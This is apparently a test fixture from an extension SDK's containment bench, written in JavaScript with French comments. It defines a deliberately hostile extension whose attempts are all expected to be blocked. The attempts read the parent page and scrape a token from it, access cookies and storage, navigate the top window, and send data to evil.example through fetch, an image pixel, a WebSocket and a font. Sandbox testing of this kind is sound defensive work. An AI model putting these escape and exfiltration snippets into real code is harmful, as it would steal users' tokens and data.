// Extension hostile de reference.
//
// Elle n'est PAS un exemple : c'est une fixture d'attaque. Chacune de ses
// tentatives doit echouer, et le banc de confinement (../run.mjs) le verifie
// dans un vrai navigateur, parce que la frontiere testee est celle du
// navigateur et d'aucun code a nous.
//
// cf SPECS/NODYX_SDK_CDC.md §14 et SPECS/NODYX_SDK_SECURITY.md §9

export async function mount({ root, nodyx }) {
  const results = []
  const attempt = async (name, expectation, fn) => {
    try {
      const leaked = await fn()
      results.push({ name, expectation, blocked: false, leaked: String(leaked).slice(0, 120) })
    } catch (e) {
      results.push({ name, expectation, blocked: true, reason: e?.name || String(e).slice(0, 60) })
    }
  }

  // ── DOM et fenetres ───────────────────────────────────────────────────────
  await attempt('parent.document', 'inaccessible', () => {
    const d = window.parent.document
    if (!d) throw new Error('null')
    return d.title
  })

  await attempt('top.document', 'inaccessible', () => {
    const d = window.top.document
    if (!d) throw new Error('null')
    return d.title
  })

  await attempt('charge SSR de l hote', 'inaccessible', () => {
    const html = window.parent.document.documentElement.innerHTML
    const m = /"token":"([^"]+)"/.exec(html)
    return m ? 'JETON LU : ' + m[1] : 'pas de jeton dans le HTML'
  })

  await attempt('document.cookie', 'vide ou refuse', () => {
    const c = document.cookie
    if (!c) throw new Error('vide')
    return c
  })

  await attempt('localStorage', 'refuse', () => {
    localStorage.setItem('evil', '1')
    return localStorage.getItem('evil')
  })

  await attempt('sessionStorage', 'refuse', () => {
    sessionStorage.setItem('evil', '1')
    return sessionStorage.getItem('evil')
  })

  await attempt('indexedDB', 'refuse', () => {
    if (!window.indexedDB) throw new Error('absent')
    window.indexedDB.open('evil')
    return 'ouvert'
  })

  // ── Navigation ────────────────────────────────────────────────────────────
  await attempt('window.open', 'refuse', () => {
    const w = window.open('https://evil.example', '_blank')
    if (!w) throw new Error('bloque')
    return 'ouvert'
  })

  await attempt('navigation de la fenetre du haut', 'refuse', () => {
    window.top.location.href = 'https://evil.example'
    return 'navigation acceptee'
  })

  // ── Reseau ────────────────────────────────────────────────────────────────
  await attempt('fetch vers un tiers', 'bloque par la politique', async () => {
    const r = await fetch('https://evil.example/collecte', { mode: 'no-cors' })
    return 'requete partie, statut ' + r.type
  })

  await attempt('image vers un tiers', 'bloquee par la politique', () => new Promise((resolve, reject) => {
    const img = new Image()
    img.onload  = () => resolve('image chargee')
    img.onerror = () => reject(new Error('bloquee'))
    img.src = 'https://evil.example/pixel.png?vole=1'
    setTimeout(() => reject(new Error('jamais chargee')), 1500)
  }))

  await attempt('websocket vers un tiers', 'bloque par la politique', async () => {
    // Le constructeur ne leve PAS quand la politique refuse : il rend une
    // socket deja fermee. Mesurer l'etat, pas l'exception.
    const ws = new WebSocket('wss://evil.example/exfil')
    await new Promise((r) => setTimeout(r, 600))
    if (ws.readyState === WebSocket.CLOSED || ws.readyState === WebSocket.CLOSING) {
      throw new Error('socket fermee')
    }
    return 'socket ouverte, etat ' + ws.readyState
  })

  await attempt('appel de l API Nodyx avec cookies', 'sans session', async () => {
    const r = await fetch('/api/v1/users/me', { credentials: 'include' })
    return 'statut ' + r.status + ', ' + (await r.text()).slice(0, 40)
  })

  // ── Styles : autorises DANS la frame, mais rien de plus ───────────────────
  await attempt('feuille de style injectee', 'autorisee, une extension doit dessiner', () => {
    const st = document.createElement('style')
    st.textContent = '.sonde-evil { color: rgb(1, 2, 3) }'
    document.head.appendChild(st)
    const el = document.createElement('div')
    el.className = 'sonde-evil'
    document.body.appendChild(el)
    const applique = getComputedStyle(el).color === 'rgb(1, 2, 3)'
    el.remove(); st.remove()
    // Ici l'attendu est l'INVERSE des autres : si la feuille ne s'applique pas,
    // aucune extension ne peut dessiner, et la surface s'affiche en texte brut.
    if (!applique) throw new Error('feuille rejetee')
    return 'appliquee'
  })

  await attempt('police chargee depuis un tiers', 'bloquee par la politique', () => new Promise((resolve, reject) => {
    const st = document.createElement('style')
    st.textContent = '@font-face { font-family: evil; src: url(https://evil.example/f.woff2) }'
    document.head.appendChild(st)
    setTimeout(() => { st.remove(); reject(new Error('aucune requete partie')) }, 800)
  }))

  // ── Le pont ───────────────────────────────────────────────────────────────
  await attempt('capacite non declaree', 'refusee', async () => {
    const v = await nodyx.storage.get('quoi-que-ce-soit')
    return 'stockage lu : ' + JSON.stringify(v)
  })

  root.textContent = 'banc de confinement'
  root.dataset.results = JSON.stringify(results)

  // Remonte aussi a la fenetre du haut, pour le cas ou le dataset serait
  // illisible depuis le banc.
  try { window.parent.postMessage({ type: 'evil:results', results }, '*') } catch { /* attendu */ }

  return { unmount() {} }
}
